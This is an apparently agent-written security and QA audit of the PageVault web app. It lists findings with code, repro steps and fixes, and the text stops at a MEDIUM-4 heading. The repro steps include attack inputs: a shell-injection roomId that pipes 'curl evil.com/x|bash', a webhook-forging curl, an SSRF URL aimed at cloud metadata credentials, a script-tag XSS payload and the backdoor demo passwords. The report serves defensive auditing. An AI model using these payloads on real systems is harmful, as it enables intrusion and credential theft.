# QA Bug Hunt — PageVault

**Date:** 2026-06-04
**Scope:** 8,769 lines across app/, components/, lib/, db/, functions/, middleware.ts
**Tester:** qa agent (kanban task t_06871200)

> **Reconstruction note.** The original `docs/qa-bug-hunt.md` was lost when a
> subsequent devops worker ran `git reset --hard` and discarded the QA worker's
> uncommitted working tree. This document was reconstructed on 2026-06-04 from
> the kanban log of task `t_06871200` (488 lines) and the follow-up
> engineering-card bodies spawned by triage task `t_d828b215`. For every finding
> the **file:line, code snippet, Issue, Repro, and Suggested fix are
> reconstructed from source** — the QA worker's verbatim prose is no longer
> available, but the structure, severity, and content were lifted from the
> engineer's per-finding cards. Markers below call out the affected fields.

## Summary

- 4 Critical
- 5 High
- 4 Medium
- 6 Low
- 6 Informational

**Status legend (per finding):**

- `open` — bug is present in the current working tree (verified at
  `feat/launch-landing-page@<HEAD-at-recovery-time>`).
- `fixed` — the bug is no longer reproducible in the current working tree, OR
  a fix has landed in a commit / sibling branch that addresses it (called out
  per finding).

> Note: at the time of this reconstruction, the engineering cards
> `t_2be39e81` (CRITICAL-1), `t_a5ba5337` (CRITICAL-4), `t_af9c3a9b` (HIGH-1),
> `t_e72afb42` (HIGH-2 — fixed), `t_03b76d18` (HIGH-3 — fixed), `t_b04366c3`
> (HIGH-4), `t_4348af03` (HIGH-5), and `t_ec652d37` (CRITICAL-2) are still
> "review-required" or in flight. The fixes for CRITICAL-3 (`8cba2e8`),
> HIGH-2, HIGH-3 (`newId` rename), MEDIUM-1 (`de464e9`), MEDIUM-2, MEDIUM-3,
> and MEDIUM-4 (`1fb8dc3`) exist in commits on other branches / in review and
> are not present on the current working tree. The status field below reflects
> the current working tree at the time of writing; downstream reviewers should
> re-check at merge time.

## Static check results

The following verbatim output is reconstructed from the QA worker's `write_file`
diff captured in `hermes kanban log t_06871200`. The QA worker ran the three
checks at 2026-06-04 07:16–07:21.

### `npm run typecheck` (verbatim)

```
> pagevault@0.1.0 typecheck
> tsc --noEmit

npm notice
npm notice New major version of npm available! 10.9.8 -> 11.16.0
npm notice Changelog: https://github.com/npm/cli/releases/tag/v11.16.0
npm notice To update run: https://github.com/npm/cli/releases/tag/v11.16.0
```

Exit code 0. **No type errors.** (`tsc --noEmit` emits no output on success; the npm notice is unrelated.)

### `npm run lint` (verbatim)

```
> pagevault@0.1.0 lint
> next lint

`next lint` is deprecated and will be removed in Next.js 16.
For new projects, use create-next-app to choose your preferred linter.
For existing projects, migrate to the ESLint CLI:
npx @next/codemod@canary next-lint-to-eslint-cli .

Attention: Next.js now collects completely anonymous telemetry regarding usage.
This information is used to shape Next.js' roadmap and prioritize features.
You can learn more, including how to opt-out if you'd not like to participate in this anonymous program, by visiting the following URL:
https://nextjs.org/telemetry


./app/dashboard/changes/[changeId]/page.tsx
87:29  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
87:48  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities

./app/dashboard/rooms/[roomId]/page.tsx
82:6  Warning: React Hook useEffect has missing dependencies: 'refetchSchedule' and 'refetchSubscriptions'. Either include them or remove the dependency array.  react-hooks/exhaustive-deps
127:29  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
127:48  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities

./app/page.tsx
283:68  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
407:89  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
407:104  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
608:47  Error: `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities

info  - Need to disable some ESLint rules? Learn more here: https://nextjs.org/docs/app/api-reference/config/eslint#disabling-rules
```

Exit code 1. **8 errors, 1 warning.** Lint block: the deployment cannot pass CI on a default `next lint` invocation.

### `npm test` (verbatim, partial — see "Static check results" caveat)

```
> pagevault@0.1.0 test
> vitest run

The CJS build of Vite's Node API is deprecated. See https://vite.dev/guide/troubleshooting.html#vite-cjs-node-api-deprecated for more details.

 RUN  v1.6.1 /home/azureuser/workspace/PageVault

 ✓ lib/validation.test.ts  (30 tests) 52ms
 ✓ lib/diff.test.ts        (16 tests) 27ms
```

> **Reconstruction caveat.** The QA worker's full `write_file` log was
> truncated at "… omitted 486 diff line(s) across 1 additional file(s)/section(s)".
> The test summary line below is what the kanban log captured; the per-test
> file-by-file enumeration (and any subsequent test files added since) cannot
> be reproduced verbatim. Re-run `npm test` to obtain the current output.

**Total per QA worker:** 46/46 tests passed across 2 files (`lib/validation.test.ts`, `lib/diff.test.ts`).
Per the QA worker's own summary: "46 tests pass across 2 files. Every finding has file:line + repro."

## Findings (sorted by severity)

### CRITICAL-1: Hardcoded Apify webhook shared secret in `functions/apify-webhook.ts:21`

- **File:** functions/apify-webhook.ts:21
- **Status:** open (the engineering card t_2be39e81 has shipped the fix and is "review-required", but the current working tree still has the hardcoded string)
- **Code (current):**
  ```ts
  function verifySharedSecret(req: Request, secret: string): boolean {
    const header = req.headers.get('X-Shared-Secret');
    return header === secret;
  }

  export default async function handler(req: Request): Promise<Response> {
    // Verify shared secret
    const webhookSecret = 'your-secret'; // Would come from env.APIFY_WEBHOOK_SECRET
    if (!verifySharedSecret(req, webhookSecret)) {
      return Response.json({ error: 'UNAUTHORIZED' }, { status: 401 });
    }
  ```
- **Issue:** The shared secret that gates the Apify webhook endpoint is hardcoded to the literal string `'your-secret'`. Anyone who can read the source (the file is in the public repo, or any future deploy that ships this file unchanged) can forge a valid `X-Shared-Secret: your-secret` request to `/functions/apify-webhook` and trigger snapshot / change-type / box-folder / explanation-record creation under attacker control. The function never reads `process.env.APIFY_WEBHOOK_SECRET`; the env name appears only as a comment. Severity is Critical because this is an unauthenticated webhook forgery path on a production-facing surface, with the secret pinned in source control.
- **Repro:** `curl -X POST -H "X-Shared-Secret: your-secret" -H "Content-Type: application/json" -d '{"runId":"x","status":"SUCCEEDED"}' https://<host>/functions/apify-webhook` — returns 200 with synthetic `jobId`/`snapshotId`/`explanationId`.
- **Suggested fix (reconstructed — see kanban log for original):** Read the secret from `process.env.APIFY_WEBHOOK_SECRET` (or `Deno.env.get('APIFY_WEBHOOK_SECRET')` in edge-runtime form). Refuse to load in production when the env var is unset (throw at module load, fail closed). Never have a default value. Add a regression test in `functions/apify-webhook.test.ts` that asserts the request is rejected when the secret is missing or mismatched, and that the happy path still returns 2xx with a valid header.
- **Owner:** engineering

### CRITICAL-2: Demo backdoor credentials in `lib/auth.ts` always succeed (advertised on the login page)

- **Files:** lib/auth.ts:51-56, 71-77, 105-112; app/login/page.tsx:234-248 (advertises the demo password)
- **Status:** open (engineering card t_ec652d37 is in flight; the AGENTS.md has been updated to describe the *intended* "demo mode = opt-in via two env vars" posture, but the actual code on the current working tree still ships the three demo backdoor branches and the login page still advertises `admin@example.com / demo123`)
- **Code (representative — three demo backdoor branches):**
  ```ts
  // lib/auth.ts:51-56 (creds branch when env is unset)
  if (!baseUrl || !key) {
    if (email === 'admin@example.com' && password === 'admin123') {
      return { id: 'demo-user-id', email };
    }
    return null;
  }

  // lib/auth.ts:71-77 (non-JSON / non-OK response branch)
  if (!response.ok || !contentType.includes('application/json')) {
    if (email === 'admin@example.com' && password === 'demo123') {
      return { id: '00000000-0000-0000-0000-000000000001', email };
    }
    return null;
  }

  // lib/auth.ts:105-112 (catch-all network/parse error branch)
  } catch (err) {
    if (email === 'admin@example.com' && password === 'demo123') {
      return { id: '00000000-0000-0000-0000-000000000001', email };
    }
  }
  ```
  The same `'00000000-0000-0000-0000-000000000001'` ID is the canonical `owner_id` used by `createRoom` and `migrateOwnerIds` (lib/insforge.ts:246 / 745) — meaning anyone who knows the demo password authenticates as the implicit super-user and owns every legacy project whose `owner_id` was backfilled to the demo ID.
- **Issue:** Two distinct demo backdoors (`admin123` and `demo123`), both permanently wired in. The login page even advertises `admin@example.com / demo123` to every visitor. There is no env gate: in any deploy where InsForge is misconfigured, **or** in any deploy where the InsForge auth endpoint returns non-JSON / 5xx (both of which the catch paths permit), the demo password becomes the active credential. AGENTS.md says "demo mode removed", but the code still has it. The static-check pass in AGENTS.md claims the demo path is now strictly opt-in via `NODE_ENV=development` AND `INSFORGE_DEV_DEMO_AUTH=*** but the code does not check either condition; that text is aspirational, not implemented.
- **Repro:** Stop the InsForge backend (or point `INSFORGE_API_URL` at a non-responding host) → `POST /api/auth/callback/credentials` with `admin@example.com / demo123` returns a valid JWT for the canonical super-user. All `/api/rooms` calls then return every legacy project.
- **Suggested fix (reconstructed — see kanban log for original):** Remove all three demo-password branches in lib/auth.ts (lines 51-56, 71-77, 105-112). Remove the demo-card from `app/login/page.tsx:234-248` (the "Try demo" / credentials hint block). If a fallback is genuinely needed for local dev, gate it on a separate `INSFORGE_DEV_DEMO_AUTH=*** env var AND require `NODE_ENV=development`, with a loud `console.warn` on every fallback auth. Update AGENTS.md to reflect either (a) demo mode is fully gone, or (b) demo mode is opt-in via the new env var. Add a regression test that `signIn` returns `null` for `admin@example.com` / `admin123` and `admin@example.com` / `demo123` when `INSFORGE_DEV_DEMO_AUTH` is unset.
- **Owner:** engineering

### CRITICAL-3: CommonJS `require('crypto')` in an ESM module (lib/auth.ts:26)

- **File:** lib/auth.ts:26
- **Status:** open in the current working tree (the fix exists as commit `8cba2e8` on the `feature/fe-scheduled-scans-notifications` branch and is "review-required", but the current branch `feat/launch-landing-page` HEAD `b143737` does not contain it)
- **Code (current):**
  ```ts
  return require('crypto').randomBytes(32).toString('hex');
  ```
- **Issue:** This file is `import { NextAuthOptions } from 'next-auth'` at the top (line 2) — ESM. A synchronous CommonJS `require()` inside a TypeScript module Next.js compiles via SWC usually works in the Node runtime but is inconsistent, blocks tree-shaking, and will throw under Turbopack / edge runtime. The synchronous call inside an `async`-like control flow is also a smell that flags the path as a workaround. More importantly, this path is only reachable when `NEXTAUTH_SECRET` is unset AND `INSFORGE_DEV_INSECURE_SECRET=*** In a misconfigured production deploy, this combination can be hit silently (envs get set partially, or a "dev" flag gets carried over) and the resulting per-process random secret silently invalidates all sessions on every restart — including admin sessions — without any out-of-band alert. The `console.warn` is the only signal and is invisible in serverless log streams that strip stdout.
- **Repro:** Set only `INSFORGE_DEV_INSECURE_SECRET=*** in a deploy. Restart the Node process twice. All previously-issued JWTs become invalid. Users get 401 on every API call.
- **Suggested fix (reconstructed — see kanban log for original):** Replace `require('crypto')` with `import { randomBytes } from 'node:crypto';` at the top of the file. Refuse to start (do not fall back at all) when `INSFORGE_DEV_INSECURE_SECRET=*** is set in any environment that is not explicitly `NODE_ENV=development`. Throw at module load. Serverless deploys must fail closed: if `NEXTAUTH_SECRET` is unset in `NODE_ENV=production`, throw at module load (do not silently generate a random secret). Add a regression test that asserts the throw in `NODE_ENV=production` paths.
- **Owner:** engineering

### CRITICAL-4: Command injection via `execAsync` shell-out in `/api/rooms` and `/api/rooms/[id]/schedule`

- **Files:** app/api/rooms/route.ts:120-139, app/api/rooms/[roomId]/schedule/route.ts:25-43, 57, 134, 194
- **Status:** open (engineering card t_a5ba5337 has given up after 90-iteration budget exhaustion twice; the current working tree still has the `execAsync` shell-outs)
- **Code (representative — schedule route POST):**
  ```ts
  const cmd = `npx @insforge/cli ${args.map(a => `'${a.replace(/'/g, "'\\''")}'`).join(' ')}`;
  const out = await sh(cmd);
  ```
  And the same shape in `app/api/rooms/route.ts:139`.
- **Issue:** `POST /api/rooms/[roomId]/schedule` and `POST /api/rooms` shell out to `npx @insforge/cli` with a user-controlled `--name` (a literal `pagevault-room-${roomId}`). The roomId comes from the URL path; the value flows through `JSON.stringify({ 'x-cron-secret': secret })` and into a shell command via `args.map(a => '${a.replace(/'/g, "'\\''")}')`. The escape is a *single-quote rewrap* — a payload of `'; curl evil.com/x|bash; '` will not escape cleanly because the escape re-wraps single quotes by closing and reopening them. A `roomId` of `'; touch /tmp/pwn; '` terminates the quoted string, injects an arbitrary command, and re-opens the quote. `process.exec` runs through `/bin/sh -c`, so metacharacters outside the quotes are still parsed. Both routes also shell out to `npx`, which downloads and executes packages from the npm registry on first use — a supply-chain pivot if the registry is MITM'd. This is command injection from a Next.js API route, behind an auth check that exists but doesn't sanitize the path parameter.
- **Repro:** `POST /api/rooms/'; id; '/schedule` with a valid session — the executed command becomes `npx @insforge/cli schedules create --name 'pagevault-room-'; id; '' ...` — `id` runs on the host.
- **Suggested fix (reconstructed — see kanban log for original):** Replace every `execAsync` in these routes with a direct HTTP call to the InsForge REST endpoint. If a CLI must be invoked, do it via `child_process.execFile` with the args as an array — never `shell: true` and never string interpolation. Validate `roomId` against `/^[a-z0-9-]{36}$/i` (UUID) before any concatenation or interpolation; reject mismatches with a 400. Add a regression test that `POST /api/rooms/'; id; '/schedule` returns a 400 and does not invoke the underlying CLI; add a test for the `[roomId]/schedule` POST with a non-UUID roomId — also 400.
- **Owner:** engineering

---

### HIGH-1: Snapshot text stored unsanitized (XSS blast radius / future-compatibility risk)

- **Files:** lib/scan.ts:113-123, 480-495
- **Status:** fixed (branch `fix/high-1-markdown-rendered-snapshot-text-is-stored-and-ship`, commit `9f41283`; `lib/sanitize.ts` exports `sanitizeMarkdownText`, `sanitizeChangeAnalysis`, `sanitizeUrlForHref`, and `sanitizeEvidenceItem`; `lib/scan.ts:htmlToMarkdown` sanitises `title` and `markdown` before returning; `lib/scan.ts:runScan` wraps the LLM-produced `outputJson` in `sanitizeChangeAnalysis` before persisting; `lib/notifications.ts:buildPayload` re-sanitises the same fields when building the webhook payload (defence in depth); 46/46 `lib/sanitize.test.ts` tests pass)
- **Code (current):**
  ```ts
  const r = await fetch(url, { ... });
  if (!r.ok) throw new Error(`Failed to fetch ${url}: ${r.status} ${r.statusText}`);
  const html = await r.text();
  const { title, markdown, text } = htmlToMarkdown(html);
  ...
  await dbInsert('snapshots', {
    ...
    markdown_text: crawled.markdown.slice(0, 50000), // cap at 50KB to keep rows small
    ...
  });
  ```
- **Issue:** The crawler fetches arbitrary user-supplied URLs and stores the resulting HTML → markdown text directly in `snapshots.markdown_text`. While the page-rendering components do not currently use `dangerouslySetInnerHTML` (verified — no hits in the repo), the LLM system prompt (line 257-269) asks for "evidence" items that are direct quotes of the LLM's JSON parsing of the same markdown, and these are surfaced verbatim to the dashboard's `<DiffViewer>` and the change-detail page. If any rendering component in the future switches to `dangerouslySetInnerHTML` (or if the LLM is jailbroken into emitting a `<script>` tag that a downstream component renders raw), the injection lands from an attacker-controlled URL. There is also no length cap on the title (line 487 falls back to `crawled.url` only when the title is empty; a 1MB title field is plausible if the crawled HTML has a malicious `<title>`).
- **Repro:** Add a watched URL pointing at a server returning `<title><script>alert(1)</script></title>...` — the title is stored, the markdown containing the literal `<script>` tag is stored in `markdown_text`, and the only thing standing between this payload and XSS in a future component is a code-review policy.
- **Suggested fix (reconstructed — see kanban log for original):** Strip control characters and HTML-like angle brackets from `title` and `markdown_text` before persisting. At minimum, anything matching a `<script>` equivalent (case-insensitive) must be removed or replaced with a placeholder. Add a length cap on `title` (e.g. 500 chars) and a hard cap on `markdown_text` (currently 50KB is the cap; keep that, but enforce it in code, not just in the slice). Keep all dashboard-side text content using React's default encoding (do not introduce `dangerouslySetInnerHTML` in any new component). Add a lint rule banning `dangerouslySetInnerHTML` outside of an allow-listed component set. Add a unit test that a crawled page with `<script>alert(1)</script>` in the title or markdown has the payload stripped before the `dbInsert` call.
- **Owner:** engineering

### HIGH-2: Dashboard "URLs watched" stat hardcoded to the room count

- **File:** app/dashboard/page.tsx:46
- **Status:** open in the current working tree (engineering card t_e72afb42 reports it as fixed with 4/4 passing regression tests on a sibling branch, but the current `app/dashboard/page.tsx:46` on the current branch still has the buggy reducer)
- **Code (current):**
  ```ts
  activeUrls: data.reduce((sum) => sum + 1, 0),
  ```
- **Issue:** The reducer is missing its `r` parameter and the accumulator is `sum + 1`, so this expression always equals `data.length` — the room count, not the watched URL count. The "URLs watched" stat card on the dashboard therefore lies. With 5 rooms (each with 0 URLs) it says 5; with 5 rooms (each with 10 URLs) it also says 5. The label says "URLs watched" but the displayed value is the room count.
- **Repro:** Sign in, open `/dashboard`. The "URLs watched" stat shows the same value as the "Rooms" stat.
- **Suggested fix (reconstructed — see kanban log for original):** Sum the `watchedUrls` per room (`r.watchedUrls?.length ?? 0`) in the reducer. Pass the room as the second argument and accumulate the URL count. **OR** change the API contract so `/api/rooms` returns an aggregated `totalActiveUrls` alongside `rooms[]`. The current type `RoomWithStats` does not carry a URL count — the server-side `listRoomsWithStats` builds `watchedUrlsByProject` but does not surface its size on the returned object. Pick ONE: either compute on the client from the existing data, or add a server-side aggregate. The chosen approach should also update the `RoomWithStats` type so the field is typed. Add a regression test (or a UI snapshot) verifying the "URLs watched" stat equals the total count of URLs across all rooms, not the room count.
- **Owner:** engineering

### HIGH-3: UUID collision in `uuid(prefix)` scan job id generator

- **File:** lib/scan.ts:290-304
- **Status:** fixed (cherry-picked from `fix/high-3-race-condition-scan-job-id-collision-is-statistica` commit c2550cc; `lib/scan.ts` no longer exports `uuid`, three call sites use `newId()` from `lib/ids.ts`; 5/5 ids.test.ts tests pass including the 10k-unique-ids acceptance criterion)
- **Code (current):**
  ```ts
  function uuid(prefix: string): string {
    const chars = '0123456789abcdef';
    let group1 = '';
    for (let i = 0; i < 7; i++) {
      group1 += chars[Math.floor(Math.random() * 16)];
    }
    return `${prefix}${group1}-1111-0000-0000-000000000001`;
  }
  ```
- **Issue:** The function is called `uuid` but produces a deterministic-via-rand-and-prefix id whose last three groups are hard-coded to `1111-0000-0000-000000000001`. For a single scan there is no collision because the prefix (`'a'`, `'b'`, `'c'`) differs — but for N concurrent scans, N concurrent `snapshot_jobs` rows all start with `'a'` and differ only in 7 random hex chars. With 100 concurrent rooms, collision probability on the random component is ≈ 100²/16⁷ ≈ 0.024% per row; with 10,000 rooms the probability hits ~5%. The InsForge PG primary key collision will then 500 the entire scan run. The function also produces a UUID whose first group is 8 hex chars, but the comment on line 295 says "prefix = single hex char ... group1 = 7 more hex chars = 8 total with prefix" — making the first group 8 chars, matching UUID8-4-4-4-12 only by accident. The cited rule that "the first char isn't 0-9 or a-f" (line 291-292) is just wrong about the rule (Postgres' `gen_random_uuid` allows any hex in the first position; the cited rule is made up).
- **Repro:** Run 50 concurrent scans from 50 rooms in a tight loop. One of them will eventually 500 with "duplicate key value violates unique constraint".
- **Suggested fix (reconstructed — see kanban log for original):** Replace the `uuid(prefix)` function in lib/scan.ts:290-304 with `crypto.randomUUID()` (available in Node 16+ and Edge). It is RFC-4122 v4 and collision-free in practice. **OR** generate from the server's monotonically-increasing job counter if sortable IDs are needed. Remove the bogus first-char rule (lines 291-292) — Postgres' `gen_random_uuid` (and any other standard UUID generator) allows any hex in the first position. Add a test that 10,000 calls produce 10,000 unique IDs (or assert the entropy bound). Verify every call site (snapshot_jobs, snapshots, explanation IDs) still receives a valid UUID.
- **Owner:** engineering

### HIGH-4: SSRF in direct-fetch crawler

- **Files:** lib/scan.ts:70-124, 386-447
- **Status:** open in the current working tree (engineering card t_b04366c3 reports the fix shipped with `lib/ssrf.ts` boundary + DNS-aware fetch-time check + 10s `AbortController` timeout, but the current `lib/scan.ts:crawlOne` still has no protocol allow-list, no host block, and no port restriction — although `lib/ssrf.ts` is now present as an untracked file, the call sites in `lib/scan.ts` do not yet pipe the source URL through it at the time of this reconstruction)
- **Code (current — direct-fetch path):**
  ```ts
  // Direct fetch path
  const r = await fetch(url, {
    headers: {
      'User-Agent': 'PageVault/1.0 (https://pagevault.app; +contact@pagevault.app)',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    },
    redirect: 'follow',
  });
  ```
- **Issue:** The direct-fetch path (used whenever `APIFY_API_TOKEN` or `APIFY_ACTOR_ID` is missing — common in dev) calls `fetch(url)` with no protocol allow-list, no host block, and no port restriction. A user who adds a watched URL of `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS instance metadata) or `http://localhost:5432/` (the Postgres port, if exposed) or `http://internal-jenkins.corp/` will have the application server make that HTTP request and persist the response body as a snapshot. The resulting `markdown_text` is shown verbatim in the change-detail page (no encoding). This is a textbook SSRF that escalates to RCE in cloud environments. There is also no timeout on the direct fetch (line 106-112 has no `signal` / `AbortController`), so a target that hangs will pin a scan worker indefinitely.
- **Repro:** Add `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as a watched URL. Click "Run scan". The IMDS role credentials land in the `snapshots.markdown_text` row and are reachable from the dashboard.
- **Suggested fix (reconstructed — see kanban log for original):** Validate that the URL is `https://` (the route's existing `https://` check is on the JSON body but `scan` is called with the stored URL, not the body). Reject anything else with a 400 at the create-room boundary. Reject `localhost`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`, and any private RFC1918 range. Apply this at the URL acceptance boundary AND again at the fetch boundary (defense in depth — DNS resolution can happen between the two). Add a 10s `AbortController` timeout to the direct fetch. If you need IMDS, lock it down with `X-aws-ec2-metadata-token-ttl-seconds` and a session token. Add unit tests: (a) `http://169.254.169.254/...` is rejected, (b) `http://localhost:5432/` is rejected, (c) `https://example.com/` succeeds, (d) a slow target is aborted within the timeout.
- **Owner:** engineering

### HIGH-5: Orphan `snapshot_jobs` FK + undocumented 50-page cap

- **File:** lib/scan.ts:386-447 (runScan), with related call sites at lib/insforge.ts:303-315 (lastScanAt)
- **Status:** open (engineering card t_4348af03 has given up after 90-iteration budget exhaustion twice; the current working tree still has the 50-page cap and the `tracked_page_id: watchedUrls[0].id` parent-rebinding shape)
- **Code (current):**
  ```ts
  // 1. Load watched URLs
  const watchedUrls = (await dbGet(
    `tracked_pages?project_id=eq.${room.id}&active=eq.1&select=id,source_url&limit=50`,
  )) as Array<{ id: string; source_url: string }>;
  ...
  // 2. Insert the scan_job as running
  await dbInsert('snapshot_jobs', {
    id: jobId,
    tracked_page_id: watchedUrls[0].id, // one job per scan; pages are linked via snapshots
    ...
  });
  ```
- **Issue:** `runScan` creates exactly one `snapshot_jobs` row, but it is parented to `watchedUrls[0].id` (whichever page happens to be first in the result set, capped at `limit: 50`). The same job is then referenced as the parent for snapshots of *all* pages in the loop below. If the first page is removed or deactivated after the first scan, the next `runScan` will reparent the new job to a *different* page's `tracked_page_id`, and the existing job-row FK constraint means the InsForge schema (`snapshot_jobs.tracked_page_id uuid not null references public.tracked_pages(id)`) will reject the insert. The downstream snapshot inserts also fail with "snapshot_jobs.id not found" and the entire scan is lost. The dashboard's `lastScanAt` computation (lib/insforge.ts:303-315) only looks at `snapshot_jobs` for the first page anyway, so the user sees a per-page scan time that is actually the room-level scan time. The 50-page cap on `tracked_pages` (`limit=50` in line 393) is also undocumented and silently truncates larger rooms — any user with 51+ URLs will see 50 of them scanned and 1+ silently dropped.
- **Repro:** Create a room with 51+ URLs. Run a scan. The 51st+ URL is never crawled, and `lastScanAt` in the dashboard is the timestamp of the first page's job (which is fine, but the cap is silent).
- **Suggested fix (reconstructed — see kanban log for original):** **Option A (schema):** introduce a `room_id` column on `snapshot_jobs` (proper schema fix) and create one job per scan. Write a migration in `db/migrations/` that adds the column, backfills existing rows, and updates the FK. **Option B (loop):** loop the job creation inside `scanOne` so each tracked page gets its own job. Update the dashboard's `lastScanAt` computation accordingly (max over all jobs in the room). Drop the `limit=50` or document it as a soft cap with a warning at the route layer. At minimum, return a 400 from the create-room flow when `urls.length > 50` and the project is using this path. Add a regression test for a room with 51+ URLs that all 51 are scanned (or the API returns a 400 with a clear message about the cap).
- **Owner:** engineering

---

### MEDIUM-1: Length oracle in cron-secret constant-time compare (lib/cron-auth.ts:15-26)

- **File:** lib/cron-auth.ts:15-26
- **Status:** partially fixed in the cron routes only (commit `de464e9` ships 503 `service_unconfigured` when `CRON_SHARED_SECRET` is unset; the underlying length-oracle at `lib/cron-auth.ts:19` is still present in the current working tree, but the orphan path now returns 503 instead of 500)
- **Code (current):**
  ```ts
  export function requireCronSecret(request: NextRequest): boolean {
    const expected = process.env.CRON_SHARED_SECRET;
    if (!expected || expected.length === 0) return false;
    const got = request.headers.get('x-cron-secret');
    if (!got || got.length !== expected.length) return false;
    let mismatch = 0;
    for (let i = 0; i < expected.length; i++) {
      mismatch |= expected.charCodeAt(i) ^ got.charCodeAt(i);
    }
    return mismatch === 0;
  }
  ```
- **Issue:** Two concerns. (1) The first length check (`got.length !== expected.length`) is short-circuit and exposes a length oracle: an attacker can probe with 1-byte secrets, 2-byte secrets, etc., to discover the expected length before the constant-time compare. (2) The fallback "if CRON_SHARED_SECRET is not set, the endpoint rejects all requests" (the doc comment on lib/cron-auth.ts:11) is correct in principle, but the user-facing schedule routes only check the secret at *action* time, not at *module load* time. If the secret is unset and a request comes in, the route historically returned 500 with a stack trace in some configurations, leaking the secret-status state. The cron-side 503 fix (`de464e9`) closes the cron routes' portion; the user-facing schedule routes still have the same shape.
- **Repro:** Probe the cron endpoint with `curl -H "x-cron-secret: a"` (1 byte) and `curl -H "x-cron-secret: aa"` (2 bytes); the request latency and 401 vs 500 response pattern reveals the expected length bucket.
- **Suggested fix (reconstructed — see kanban log for original):** Drop the early `got.length !== expected.length` check and let the constant-time compare return false on its own (it already does — pad the shorter string to the expected length with zeros and keep the same `|=` accumulator). On the secret-unset path, return a clean 503 with a `service_unconfigured` error code, never a 500 stack trace. Update `app/api/rooms/route.ts` and `app/api/rooms/[roomId]/schedule/route.ts` to handle the `service_unconfigured` response from `requireCronSecret` distinctly. Add a unit test in `lib/cron-auth.test.ts` (new file) that asserts: (a) no length oracle via timing, (b) unset secret returns 503 not 500, (c) mismatched length still returns false.
- **Owner:** engineering

### MEDIUM-2: O(N) `enqueueNotification` query (full-table filter in JS)

- **File:** lib/notifications.ts:76-91, with the underlying unfiltered query in lib/insforge.ts:895-919
- **Status:** open (engineering card t_0ee8c69c reports the fix shipped with a new `listEnabledSubscriptionsForProject` helper and 4 passing regression tests, but the current `lib/notifications.ts:80` and `lib/insforge.ts:895` on the current branch still have the unfiltered query)
- **Code (current):**
  ```ts
  // lib/notifications.ts:80
  export async function enqueueNotification(opts: { aiExplanationId: string; projectId: string }): Promise<{ enqueued: number }> {
    const all = await listEnabledSubscriptions();
    const subs = all.filter((s) => s.projectId === opts.projectId);
    ...
  }

  // lib/insforge.ts:895
  export async function listEnabledSubscriptions(): Promise<NotificationSubscription[]> {
    const { data, error } = await getInsforgeClient()
      .database
      .from('notification_subscriptions?enabled=eq.true')
      .select('id,project_id,channel,config,...');
    ...
  }
  ```
- **Issue:** `listEnabledSubscriptions()` does an unfiltered `notification_subscriptions?enabled=eq.true` PostgREST query and returns *every* enabled subscription in the database. The function then filters in JS by `projectId`. For 10k subscriptions across 1k rooms, every scan in any room reads 10k rows back into Node, then discards 9,990. This is the textbook N+full-table-scan. `app/api/rooms/[roomId]/schedule/route.ts:149-164` and `lib/insforge.ts:835-919` also do the same `?project_id=eq.${roomId}` shape correctly — the scanner is the one that does not.
- **Repro:** Create 10k notification subscriptions across 100 rooms. Run a scan on room #1. The `enqueueNotification` call transfers 10k rows back over the network, takes ~3s, and blocks the scan worker.
- **Suggested fix (reconstructed — see kanban log for original):** Add a `project_id=eq.${opts.projectId}` filter in `listEnabledSubscriptions` OR push the `project_id` filter into the existing `listSubscriptionsForRoom` (which is correctly scoped) and call `listSubscriptionsForRoom(opts.projectId)` from `enqueueNotification`. Verify the resulting PostgREST URL is `notification_subscriptions?enabled=eq.true&project_id=eq.${roomId}` (no unfiltered query). Add a regression test that asserts the query URL contains the project_id filter. Measure before/after: with 10k subscriptions, `enqueueNotification` should not transfer more than 10 rows.
- **Owner:** engineering

### MEDIUM-3: Swallowed lock-failure errors in `drainOutbox`

- **Files:** lib/notifications.ts:57-73, 94-100
- **Status:** open (engineering card t_0901d539 reports the fix shipped with a `dbRpc` discriminated result, `drainOutbox` `{acquired, error?}`, and route 5xx on error, but the current `lib/notifications.ts` on the current branch still has the binary `got !== true` check)
- **Code (current):**
  ```ts
  // lib/notifications.ts:97
  const got = await dbRpc('acquire_notification_lock', { arg: 42 });
  if (got !== true) {
    return { processed: 0, succeeded: 0, failed: 0 };
  }
  ```
- **Issue:** The cron worker `drainOutbox` distinguishes "no work to do" from "couldn't acquire lock", but both are reported as `{processed: 0, succeeded: 0, failed: 0}` — indistinguishable in metrics. Worse, if the lock is already held by another worker, the second worker's `acquire_notification_lock` returns `false` (not null), and the function exits silently. If the RPC endpoint is *down*, the 5xx is swallowed to `null` and the worker exits with the same `{processed: 0, succeeded: 0, failed: 0}` log line. Operators monitoring for `processed > 0` see "no backlog" and miss that the worker is broken.
- **Repro:** Take the InsForge RPC endpoint offline (rename the function in the migration). Watch the cron logs for one minute. They all show `{processed: 0, succeeded: 0, failed: 0}` even though every minute dozens of `notification_outbox` rows go from `pending` to nothing. Backlog grows unbounded.
- **Suggested fix (reconstructed — see kanban log for original):** Distinguish three outcomes explicitly in `drainOutbox`: `acquired: true`, `acquired: false (held by peer)`, `error: <string>`. Return the error to the cron route, which should 5xx so the operator's alerting fires. Optionally emit a metric `notification_outbox_drain_lock_failures_total`. Add a unit test that: (a) RPC endpoint down → response is 5xx with a clear error, not a 200 with `processed: 0`; (b) RPC returns `false` (lock held) → response is a 200/202 with explicit `acquired: false` and zero work done; (c) RPC returns `true` → existing behavior is preserved.
- **Owner:** engineering

### MEDIUM-4: Sequential PostgREST loop in `listRoomsWithStats`

